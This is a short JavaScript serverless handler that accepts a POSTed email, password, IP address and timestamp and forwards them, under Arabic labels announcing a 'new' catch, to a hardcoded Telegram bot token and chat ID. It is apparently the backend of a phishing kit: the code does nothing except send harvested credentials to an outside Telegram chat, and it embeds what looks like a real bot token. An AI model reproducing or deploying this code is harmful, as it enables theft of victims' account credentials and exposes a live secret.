export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    const { email, pass, ip, time } = req.body;
    
    // إرسال إلى Telegram
    const botToken = '8754272812:AAGpmvHz9mIrgEYintSzApfI7HXmK751DPc';
    const chatId = '5977485445';
    const msg = `🔔 جديد!\n📧 الإيميل: ${email}\n🔑 كلمة السر: ${pass}\n🕐 الوقت: ${time}\n🌐 الآيبي: ${ip}`;
    
    try {
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: msg })
        });
        
        res.status(200).json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
}